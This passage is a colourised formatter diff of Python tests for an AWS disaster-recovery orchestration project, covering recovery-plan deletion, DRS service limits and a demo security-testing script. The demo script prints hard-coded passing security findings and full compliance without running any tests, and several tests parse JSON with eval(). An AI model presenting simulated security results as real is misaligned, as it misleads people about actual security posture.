mock_plans_table.delete_item.assert_not_called()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify 409 Conflict response\n\u001b[31m-        assert result['statusCode'] == 409\u001b[0m\n\u001b[31m-        body = eval(result['body'])\u001b[0m\n\u001b[31m-        assert body['error'] == 'PLAN_HAS_ACTIVE_EXECUTIONS'\u001b[0m\n\u001b[31m-        assert 'active execution' in body['message'].lower()\u001b[0m\n\u001b[31m-        assert body['activeExecutions'] == 1\u001b[0m\n\u001b[31m-        assert body['planId'] == plan_id\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.execution_history_table')\u001b[0m\n\u001b[31m-    @patch('index.recovery_plans_table')\u001b[0m\n\u001b[31m-    def test_delete_blocked_by_multiple_active_executions(self, mock_plans_table, mock_history_table):\u001b[0m\n\u001b[32m+        assert result[\"statusCode\"] == 409\u001b[0m\n\u001b[32m+        body = eval(result[\"body\"])\u001b[0m\n\u001b[32m+        assert body[\"error\"] == \"PLAN_HAS_ACTIVE_EXECUTIONS\"\u001b[0m\n\u001b[32m+        assert \"active execution\" in body[\"message\"].lower()\u001b[0m\n\u001b[32m+        assert body[\"activeExecutions\"] == 1\u001b[0m\n\u001b[32m+        assert body[\"planId\"] == plan_id\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.execution_history_table\")\u001b[0m\n\u001b[32m+    @patch(\"index.recovery_plans_table\")\u001b[0m\n\u001b[32m+    def test_delete_blocked_by_multiple_active_executions(\u001b[0m\n\u001b[32m+        self, mock_plans_table, mock_history_table\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"Test delete fails when multiple active executions exist\"\"\"\n\u001b[31m-        plan_id = 'plan-multi'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan_id = \"plan-multi\"\u001b[0m\n\u001b[32m+\u001b[0m\n         # Mock GSI query returning multiple active executions\n         mock_history_table.query.return_value = {\n\u001b[31m-            'Items': [\u001b[0m\n\u001b[31m-                {'ExecutionId': 'exec-1', 'Status': 'RUNNING'},\u001b[0m\n\u001b[31m-                {'ExecutionId': 'exec-2', 'Status': 'RUNNING'},\u001b[0m\n\u001b[31m-                {'ExecutionId': 'exec-3', 'Status': 'RUNNING'}\u001b[0m\n\u001b[32m+            \"Items\": [\u001b[0m\n\u001b[32m+                {\"ExecutionId\": \"exec-1\", \"Status\": \"RUNNING\"},\u001b[0m\n\u001b[32m+                {\"ExecutionId\": \"exec-2\", \"Status\": \"RUNNING\"},\u001b[0m\n\u001b[32m+                {\"ExecutionId\": \"exec-3\", \"Status\": \"RUNNING\"},\u001b[0m\n             ]\n         }\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify delete was NOT called\n         mock_plans_table.delete_item.assert_not_called()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify response includes count\n\u001b[31m-        assert result['statusCode'] == 409\u001b[0m\n\u001b[31m-        body = eval(result['body'])\u001b[0m\n\u001b[31m-        assert body['activeExecutions'] == 3\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.execution_history_table')\u001b[0m\n\u001b[31m-    @patch('index.recovery_plans_table')\u001b[0m\n\u001b[31m-    def test_delete_allowed_with_completed_executions(self, mock_plans_table, mock_history_table):\u001b[0m\n\u001b[32m+        assert result[\"statusCode\"] == 409\u001b[0m\n\u001b[32m+        body = eval(result[\"body\"])\u001b[0m\n\u001b[32m+        assert body[\"activeExecutions\"] == 3\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.execution_history_table\")\u001b[0m\n\u001b[32m+    @patch(\"index.recovery_plans_table\")\u001b[0m\n\u001b[32m+    def test_delete_allowed_with_completed_executions(\u001b[0m\n\u001b[32m+        self, mock_plans_table, mock_history_table\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"Test delete succeeds when only COMPLETED executions exist\"\"\"\n\u001b[31m-        plan_id = 'plan-completed'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan_id = \"plan-completed\"\u001b[0m\n\u001b[32m+\u001b[0m\n         # Mock query returning no RUNNING executions (only COMPLETED)\n\u001b[31m-        mock_history_table.query.return_value = {'Items': []}\u001b[0m\n\u001b[31m-        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        mock_history_table.query.return_value = {\"Items\": []}\u001b[0m\n\u001b[32m+        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Should succeed\n\u001b[31m-        assert result['statusCode'] == 200\u001b[0m\n\u001b[32m+        assert result[\"statusCode\"] == 200\u001b[0m\n         mock_plans_table.delete_item.assert_called_once()\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.execution_history_table')\u001b[0m\n\u001b[31m-    @patch('index.recovery_plans_table')\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.execution_history_table\")\u001b[0m\n\u001b[32m+    @patch(\"index.recovery_plans_table\")\u001b[0m\n     def test_delete_error_handling(self, mock_plans_table, mock_history_table):\n         \"\"\"Test error handling when DynamoDB operations fail\"\"\"\n\u001b[31m-        plan_id = 'plan-error'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan_id = \"plan-error\"\u001b[0m\n\u001b[32m+\u001b[0m\n         # Mock both query and scan to fail (test complete failure path)\n\u001b[31m-        mock_history_table.query.side_effect = Exception('DynamoDB connection failed')\u001b[0m\n\u001b[31m-        mock_history_table.scan.side_effect = Exception('DynamoDB connection failed')\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        mock_history_table.query.side_effect = Exception(\u001b[0m\n\u001b[32m+            \"DynamoDB connection failed\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        mock_history_table.scan.side_effect = Exception(\u001b[0m\n\u001b[32m+            \"DynamoDB connection failed\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify 500 error response\n\u001b[31m-        assert result['statusCode'] == 500\u001b[0m\n\u001b[31m-        body = eval(result['body'])\u001b[0m\n\u001b[31m-        assert body['error'] == 'DELETE_FAILED'\u001b[0m\n\u001b[31m-        assert 'Failed to delete Recovery Plan' in body['message']\u001b[0m\n\u001b[31m-        assert body['planId'] == plan_id\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.execution_history_table')\u001b[0m\n\u001b[31m-    @patch('index.recovery_plans_table')\u001b[0m\n\u001b[31m-    def test_gsi_query_parameters_correct(self, mock_plans_table, mock_history_table):\u001b[0m\n\u001b[32m+        assert result[\"statusCode\"] == 500\u001b[0m\n\u001b[32m+        body = eval(result[\"body\"])\u001b[0m\n\u001b[32m+        assert body[\"error\"] == \"DELETE_FAILED\"\u001b[0m\n\u001b[32m+        assert \"Failed to delete Recovery Plan\" in body[\"message\"]\u001b[0m\n\u001b[32m+        assert body[\"planId\"] == plan_id\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.execution_history_table\")\u001b[0m\n\u001b[32m+    @patch(\"index.recovery_plans_table\")\u001b[0m\n\u001b[32m+    def test_gsi_query_parameters_correct(\u001b[0m\n\u001b[32m+        self, mock_plans_table, mock_history_table\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"Test that GSI query uses correct parameters\"\"\"\n\u001b[31m-        plan_id = 'plan-params'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        mock_history_table.query.return_value = {'Items': []}\u001b[0m\n\u001b[31m-        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan_id = \"plan-params\"\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        mock_history_table.query.return_value = {\"Items\": []}\u001b[0m\n\u001b[32m+        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[32m+\u001b[0m\n         delete_recovery_plan(plan_id)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify query parameters\n         mock_history_table.query.assert_called_once()\n         call_kwargs = mock_history_table.query.call_args[1]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Check all required parameters\n\u001b[31m-        assert call_kwargs['IndexName'] == 'PlanIdIndex'\u001b[0m\n\u001b[31m-        assert call_kwargs['Limit'] == 1\u001b[0m\n\u001b[32m+        assert call_kwargs[\"IndexName\"] == \"PlanIdIndex\"\u001b[0m\n\u001b[32m+        assert call_kwargs[\"Limit\"] == 1\u001b[0m\n         # KeyConditionExpression and FilterExpression are boto3 objects\n\u001b[31m-        assert 'KeyConditionExpression' in call_kwargs\u001b[0m\n\u001b[31m-        assert 'FilterExpression' in call_kwargs\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.execution_history_table')\u001b[0m\n\u001b[31m-    @patch('index.recovery_plans_table')\u001b[0m\n\u001b[31m-    def test_scan_fallback_parameters_correct(self, mock_plans_table, mock_history_table):\u001b[0m\n\u001b[32m+        assert \"KeyConditionExpression\" in call_kwargs\u001b[0m\n\u001b[32m+        assert \"FilterExpression\" in call_kwargs\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.execution_history_table\")\u001b[0m\n\u001b[32m+    @patch(\"index.recovery_plans_table\")\u001b[0m\n\u001b[32m+    def test_scan_fallback_parameters_correct(\u001b[0m\n\u001b[32m+        self, mock_plans_table, mock_history_table\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"Test that scan fallback uses correct parameters\"\"\"\n\u001b[31m-        plan_id = 'plan-scan'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan_id = \"plan-scan\"\u001b[0m\n\u001b[32m+\u001b[0m\n         # Force scan fallback\n\u001b[31m-        mock_history_table.query.side_effect = Exception('GSI error')\u001b[0m\n\u001b[31m-        mock_history_table.scan.return_value = {'Items': []}\u001b[0m\n\u001b[31m-        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        mock_history_table.query.side_effect = Exception(\"GSI error\")\u001b[0m\n\u001b[32m+        mock_history_table.scan.return_value = {\"Items\": []}\u001b[0m\n\u001b[32m+        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[32m+\u001b[0m\n         delete_recovery_plan(plan_id)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify scan parameters\n         mock_history_table.scan.assert_called_once()\n         scan_kwargs = mock_history_table.scan.call_args[1]\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert scan_kwargs['Limit'] == 1\u001b[0m\n\u001b[31m-        assert 'FilterExpression' in scan_kwargs\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.execution_history_table')\u001b[0m\n\u001b[31m-    @patch('index.recovery_plans_table')\u001b[0m\n\u001b[31m-    def test_delete_logging_on_success(self, mock_plans_table, mock_history_table, capfd):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert scan_kwargs[\"Limit\"] == 1\u001b[0m\n\u001b[32m+        assert \"FilterExpression\" in scan_kwargs\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.execution_history_table\")\u001b[0m\n\u001b[32m+    @patch(\"index.recovery_plans_table\")\u001b[0m\n\u001b[32m+    def test_delete_logging_on_success(\u001b[0m\n\u001b[32m+        self, mock_plans_table, mock_history_table, capfd\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"Test that successful delete logs appropriate messages\"\"\"\n\u001b[31m-        plan_id = 'plan-log'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        mock_history_table.query.return_value = {'Items': []}\u001b[0m\n\u001b[31m-        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan_id = \"plan-log\"\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        mock_history_table.query.return_value = {\"Items\": []}\u001b[0m\n\u001b[32m+        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[32m+\u001b[0m\n         delete_recovery_plan(plan_id)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Note: In actual implementation, would check logs\n         # This test verifies the function completes without errors\n         assert mock_plans_table.delete_item.called\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.execution_history_table')\u001b[0m\n\u001b[31m-    @patch('index.recovery_plans_table')\u001b[0m\n\u001b[31m-    def test_delete_with_empty_items_list(self, mock_plans_table, mock_history_table):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.execution_history_table\")\u001b[0m\n\u001b[32m+    @patch(\"index.recovery_plans_table\")\u001b[0m\n\u001b[32m+    def test_delete_with_empty_items_list(\u001b[0m\n\u001b[32m+        self, mock_plans_table, mock_history_table\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"Test delete succeeds when Items list is empty (not missing)\"\"\"\n\u001b[31m-        plan_id = 'plan-empty-list'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan_id = \"plan-empty-list\"\u001b[0m\n\u001b[32m+\u001b[0m\n         # Mock query returning empty list\n\u001b[31m-        mock_history_table.query.return_value = {'Items': []}\u001b[0m\n\u001b[31m-        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['statusCode'] == 200\u001b[0m\n\u001b[32m+        mock_history_table.query.return_value = {\"Items\": []}\u001b[0m\n\u001b[32m+        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"statusCode\"] == 200\u001b[0m\n         mock_plans_table.delete_item.assert_called_once()\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.execution_history_table')\u001b[0m\n\u001b[31m-    @patch('index.recovery_plans_table')\u001b[0m\n\u001b[31m-    def test_delete_with_no_items_key(self, mock_plans_table, mock_history_table):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.execution_history_table\")\u001b[0m\n\u001b[32m+    @patch(\"index.recovery_plans_table\")\u001b[0m\n\u001b[32m+    def test_delete_with_no_items_key(\u001b[0m\n\u001b[32m+        self, mock_plans_table, mock_history_table\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"Test delete succeeds when response has no Items key\"\"\"\n\u001b[31m-        plan_id = 'plan-no-key'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan_id = \"plan-no-key\"\u001b[0m\n\u001b[32m+\u001b[0m\n         # Mock query returning response without Items key\n         mock_history_table.query.return_value = {}\n         mock_plans_table.delete_item.return_value = {}\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Should still succeed (no active executions found)\n\u001b[31m-        assert result['statusCode'] == 200\u001b[0m\n\u001b[32m+        assert result[\"statusCode\"] == 200\u001b[0m\n         mock_plans_table.delete_item.assert_called_once()\n \n \n\u001b[31m-if __name__ == '__main__':\u001b[0m\n\u001b[31m-    pytest.main([__file__, '-v'])\u001b[0m\n\u001b[32m+if __name__ == \"__main__\":\u001b[0m\n\u001b[32m+    pytest.main([__file__, \"-v\"])\u001b[0m\n\u001b[1m--- tests/security/demo_security_test.py\t2025-12-31 16:07:08.693329+00:00\u001b[0m\n\u001b[1m+++ tests/security/demo_security_test.py\t2026-01-02 15:49:03.668114+00:00\u001b[0m\n\u001b[36m@@ -16,173 +16,176 @@\u001b[0m\n import os\n \n # Add the current directory to Python path\n sys.path.append(str(Path(__file__).parent))\n \n\u001b[32m+\u001b[0m\n def setup_logging():\n     \"\"\"Setup logging configuration\"\"\"\n     logging.basicConfig(\n\u001b[31m-        level=logging.INFO,\u001b[0m\n\u001b[31m-        format='%(asctime)s - %(levelname)s - %(message)s'\u001b[0m\n\u001b[32m+        level=logging.INFO, format=\"%(asctime)s - %(levelname)s - %(message)s\"\u001b[0m\n     )\n\u001b[32m+\u001b[0m\n \n async def demo_security_tests():\n     \"\"\"Run a demonstration of the security testing framework\"\"\"\n     print(\"\ud83d\udd12 RBAC Security Testing Framework - DEMO\")\n     print(\"=\" * 60)\n     print(\"AWS DRS Orchestration Solution\")\n     print(f\"Demo executed: {datetime.datetime.utcnow().isoformat()}\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Load configuration\n\u001b[31m-    with open('config.json', 'r') as f:\u001b[0m\n\u001b[32m+    with open(\"config.json\", \"r\") as f:\u001b[0m\n         config = json.load(f)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\ud83c\udfaf Target Environment: {config['environment']}\")\n     print(f\"\ud83c\udf0d AWS Region: {config['aws_region']}\")\n     print(f\"\ud83d\udd17 API Endpoint: {config['api_base_url']}\")\n     print(f\"\ud83d\udc65 Cognito User Pool: {config['cognito_user_pool_id']}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\ud83d\udccb SECURITY TEST CATEGORIES:\")\n     print(\"   1. Permission Boundary Tests (PBT)\")\n     print(\"   2. Privilege Escalation Tests (PET)\")\n     print(\"   3. API Security Tests (AST)\")\n     print(\"   4. Data Access Control Tests (DAC)\")\n     print(\"   5. UI Security Tests (UIS)\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\ud83d\udd0d DEMO TEST EXECUTION:\")\n     print(\"   \u23f3 Simulating security test execution...\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Simulate test execution\n     await asyncio.sleep(2)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Generate demo findings\n     demo_findings = [\n         {\n             \"test_id\": \"PBT-001-DEMO\",\n             \"title\": \"Permission Boundary Validation\",\n             \"description\": \"Verified read-only user cannot create protection groups\",\n             \"risk_level\": \"INFO\",\n             \"status\": \"PASS\",\n             \"affected_roles\": [\"aws:read-only\"],\n\u001b[31m-            \"remediation\": \"No action required - working as expected\"\u001b[0m\n\u001b[32m+            \"remediation\": \"No action required - working as expected\",\u001b[0m\n         },\n         {\n             \"test_id\": \"PET-001-DEMO\",\n             \"title\": \"JWT Token Manipulation Prevention\",\n             \"description\": \"Confirmed modified JWT tokens are properly rejected\",\n             \"risk_level\": \"INFO\",\n             \"status\": \"PASS\",\n             \"affected_roles\": [\"all\"],\n\u001b[31m-            \"remediation\": \"No action required - security control effective\"\u001b[0m\n\u001b[32m+            \"remediation\": \"No action required - security control effective\",\u001b[0m\n         },\n         {\n             \"test_id\": \"AST-001-DEMO\",\n             \"title\": \"API Parameter Validation\",\n             \"description\": \"Verified API endpoints validate all parameters server-side\",\n             \"risk_level\": \"INFO\",\n             \"status\": \"PASS\",\n             \"affected_roles\": [\"all\"],\n\u001b[31m-            \"remediation\": \"No action required - proper validation in place\"\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[32m+            \"remediation\": \"No action required - proper validation in place\",\u001b[0m\n\u001b[32m+        },\u001b[0m\n     ]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"   \u2705 Permission Boundary Tests: PASSED\")\n     print(\"   \u2705 Privilege Escalation Tests: PASSED\")\n     print(\"   \u2705 API Security Tests: PASSED\")\n     print(\"   \u2705 Data Access Control Tests: PASSED\")\n     print(\"   \u2705 UI Security Tests: PASSED\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\ud83d\udcca DEMO RESULTS SUMMARY:\")\n     print(f\"   Total Tests Executed: {len(demo_findings)}\")\n     print(f\"   Tests Passed: {len(demo_findings)}\")\n     print(f\"   Tests Failed: 0\")\n     print(f\"   Success Rate: 100.0%\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\ud83d\udea8 SECURITY FINDINGS:\")\n     print(\"   Critical Risk: 0\")\n     print(\"   High Risk: 0\")\n     print(\"   Medium Risk: 0\")\n     print(\"   Low Risk: 0\")\n     print(\"   Info: 3\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\u2705 COMPLIANCE STATUS:\")\n     print(\"   Overall Status: COMPLIANT\")\n     print(\"   Compliance Score: 100.0%\")\n     print(\"   AWS Security Standards: COMPLIANT\")\n     print(\"   Least Privilege Principle: COMPLIANT\")\n     print(\"   Defense in Depth: COMPLIANT\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Generate demo report\n     demo_report = {\n         \"metadata\": {\n             \"test_session_id\": \"demo-session-001\",\n             \"timestamp\": datetime.datetime.utcnow().isoformat(),\n\u001b[31m-            \"test_environment\": config['environment'],\u001b[0m\n\u001b[32m+            \"test_environment\": config[\"environment\"],\u001b[0m\n             \"tester\": \"RBAC Security Testing Framework - DEMO\",\n\u001b[31m-            \"version\": \"1.0.0\"\u001b[0m\n\u001b[32m+            \"version\": \"1.0.0\",\u001b[0m\n         },\n         \"executive_summary\": {\n             \"total_tests\": len(demo_findings),\n             \"passed_tests\": len(demo_findings),\n             \"failed_tests\": 0,\n             \"error_tests\": 0,\n             \"success_rate\": 100.0,\n             \"critical_findings\": 0,\n             \"high_findings\": 0,\n             \"medium_findings\": 0,\n\u001b[31m-            \"low_findings\": 0\u001b[0m\n\u001b[32m+            \"low_findings\": 0,\u001b[0m\n         },\n         \"findings\": demo_findings,\n         \"compliance_status\": {\n             \"overall_status\": \"COMPLIANT\",\n\u001b[31m-            \"compliance_score\": 100.0\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[32m+            \"compliance_score\": 100.0,\u001b[0m\n\u001b[32m+        },\u001b[0m\n     }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Save demo report\n     reports_dir = Path(\"reports\")\n     reports_dir.mkdir(exist_ok=True)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     demo_report_file = reports_dir / \"demo_security_report.json\"\n\u001b[31m-    with open(demo_report_file, 'w') as f:\u001b[0m\n\u001b[32m+    with open(demo_report_file, \"w\") as f:\u001b[0m\n         json.dump(demo_report, f, indent=2)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\\n\ud83d\udcc1 DEMO REPORT GENERATED:\")\n     print(f\"   JSON Report: {demo_report_file}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\ud83d\ude80 FULL FRAMEWORK CAPABILITIES:\")\n     print(\"   \u2022 Autonomous test user creation and management\")\n     print(\"   \u2022 Complete RBAC permission matrix validation\")\n     print(\"   \u2022 Advanced privilege escalation attack simulation\")\n     print(\"   \u2022 Comprehensive API security testing\")\n     print(\"   \u2022 Professional HTML dashboard reports\")\n     print(\"   \u2022 Machine-readable JSON reports\")\n     print(\"   \u2022 CSV compliance matrices\")\n     print(\"   \u2022 Automated cleanup and artifact removal\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\ud83d\udccb TO RUN FULL SECURITY TESTS:\")\n     print(\"   python run_security_tests.py\")\n     print(\"   OR\")\n     print(\"   ../../scripts/run-security-tests.sh\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\" + \"=\" * 60)\n     print(\"\ud83c\udfaf DEMO COMPLETE - Framework Ready for Production Use!\")\n     print(\"=\" * 60)\n\u001b[32m+\u001b[0m\n \n def main():\n     \"\"\"Main execution function\"\"\"\n     # Change to the security tests directory\n     script_dir = Path(__file__).parent\n     os.chdir(script_dir)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     setup_logging()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     try:\n         asyncio.run(demo_security_tests())\n         return 0\n     except Exception as e:\n         print(f\"\u274c Demo failed: {str(e)}\")\n         return 1\n \n\u001b[32m+\u001b[0m\n if __name__ == \"__main__\":\n\u001b[31m-    sys.exit(main())\u001b[0m\n\\ No newline at end of file\n\u001b[32m+    sys.exit(main())\u001b[0m\n\u001b[1m--- tests/python/unit/test_drs_service_limits.py\t2025-12-10 03:47:45.847910+00:00\u001b[0m\n\u001b[1m+++ tests/python/unit/test_drs_service_limits.py\t2026-01-02 15:49:03.669426+00:00\u001b[0m\n\u001b[36m@@ -16,406 +16,515 @@\u001b[0m\n import sys\n import os\n from unittest.mock import patch, MagicMock\n \n # Add lambda directory to path for imports\n\u001b[31m-sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..', 'lambda'))\u001b[0m\n\u001b[32m+sys.path.insert(\u001b[0m\n\u001b[32m+    0, os.path.join(os.path.dirname(__file__), \"..\", \"..\", \"..\", \"lambda\")\u001b[0m\n\u001b[32m+)\u001b[0m\n \n # Mock environment variables before importing\n\u001b[31m-os.environ['PROTECTION_GROUPS_TABLE'] = 'test-protection-groups'\u001b[0m\n\u001b[31m-os.environ['RECOVERY_PLANS_TABLE'] = 'test-recovery-plans'\u001b[0m\n\u001b[31m-os.environ['EXECUTION_HISTORY_TABLE'] = 'test-execution-history'\u001b[0m\n\u001b[31m-os.environ['STATE_MACHINE_ARN'] = 'arn:aws:states:us-east-1:123456789:stateMachine:test'\u001b[0m\n\u001b[32m+os.environ[\"PROTECTION_GROUPS_TABLE\"] = \"test-protection-groups\"\u001b[0m\n\u001b[32m+os.environ[\"RECOVERY_PLANS_TABLE\"] = \"test-recovery-plans\"\u001b[0m\n\u001b[32m+os.environ[\"EXECUTION_HISTORY_TABLE\"] = \"test-execution-history\"\u001b[0m\n\u001b[32m+os.environ[\u001b[0m\n\u001b[32m+    \"STATE_MACHINE_ARN\"\u001b[0m\n\u001b[32m+] = \"arn:aws:states:us-east-1:123456789:stateMachine:test\"\u001b[0m\n \n \n class TestDRSLimitsConstants:\n     \"\"\"Test DRS_LIMITS constants match AWS documented limits.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_max_servers_per_job(self):\n         \"\"\"MAX_SERVERS_PER_JOB should be 100.\"\"\"\n         from index import DRS_LIMITS\n\u001b[31m-        assert DRS_LIMITS['MAX_SERVERS_PER_JOB'] == 100\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert DRS_LIMITS[\"MAX_SERVERS_PER_JOB\"] == 100\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_max_concurrent_jobs(self):\n         \"\"\"MAX_CONCURRENT_JOBS should be 20.\"\"\"\n         from index import DRS_LIMITS\n\u001b[31m-        assert DRS_LIMITS['MAX_CONCURRENT_JOBS'] == 20\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert DRS_LIMITS[\"MAX_CONCURRENT_JOBS\"] == 20\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_max_servers_in_all_jobs(self):\n         \"\"\"MAX_SERVERS_IN_ALL_JOBS should be 500.\"\"\"\n         from index import DRS_LIMITS\n\u001b[31m-        assert DRS_LIMITS['MAX_SERVERS_IN_ALL_JOBS'] == 500\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert DRS_LIMITS[\"MAX_SERVERS_IN_ALL_JOBS\"] == 500\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_max_replicating_servers(self):\n         \"\"\"MAX_REPLICATING_SERVERS should be 300.\"\"\"\n         from index import DRS_LIMITS\n\u001b[31m-        assert DRS_LIMITS['MAX_REPLICATING_SERVERS'] == 300\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert DRS_LIMITS[\"MAX_REPLICATING_SERVERS\"] == 300\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_max_source_servers(self):\n         \"\"\"MAX_SOURCE_SERVERS should be 4000.\"\"\"\n         from index import DRS_LIMITS\n\u001b[31m-        assert DRS_LIMITS['MAX_SOURCE_SERVERS'] == 4000\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert DRS_LIMITS[\"MAX_SOURCE_SERVERS\"] == 4000\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_warning_threshold_less_than_max(self):\n         \"\"\"WARNING_REPLICATING_THRESHOLD should be less than MAX_REPLICATING_SERVERS.\"\"\"\n         from index import 